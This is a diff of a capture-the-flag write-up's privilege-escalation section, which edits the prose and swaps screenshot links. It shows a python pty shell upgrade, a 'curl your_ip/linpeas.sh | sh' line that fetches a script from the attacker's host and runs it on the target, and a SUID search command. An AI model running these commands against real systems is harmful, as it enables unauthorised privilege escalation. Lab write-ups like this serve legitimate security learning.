@@ -68,7 +68,7 @@ We can use python for that: python -c 'import pty; pty.spawn("/bin/bash")'
 
 ##Privilege Escalation
 
-After looking for the most common places to escalate i didn't find anything and decided to make my life easier by setting up a http server on my host machine and curl linpeas.sh on the target.
+Lets make our life easier by setting up a http server on my host machine and curl linpeas.sh on the target.
 
 [![https://imgur.com/32WBOx6.png](https://imgur.com/32WBOx6.png)](https://imgur.com/32WBOx6.png)
 
@@ -78,7 +78,14 @@ curl http://your_ip:8000/linpeas.sh | sh you can get linpeas.sh and execute it.
 
 (Of course you need to download it first https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
+[![https://imgur.com/QhNXV9u.png](https://imgur.com/QhNXV9u.png)](https://imgur.com/QhNXV9u.png)
 
-[![https://imgur.com/pLoEbad.png](https://imgur.com/pLoEbad.png)](https://imgur.com/pLoEbad.png)
-[![https://imgur.com/icZAOXp.png](https://imgur.com/icZAOXp.png)](https://imgur.com/icZAOXp.png)
+[![https://imgur.com/LwpJgWs.png](https://imgur.com/LwpJgWs.png)](https://imgur.com/LwpJgWs.png)
 
+[![https://imgur.com/RinrpKl.png](https://imgur.com/RinrpKl.png)](https://imgur.com/RinrpKl.png)
+
+In hindsight linpeas was maybe a bit overkill we could have also checked for SUID's manually with:
+
+find / -perm /4000 -type f 2>/dev/null
+
+Thank you for reading :)
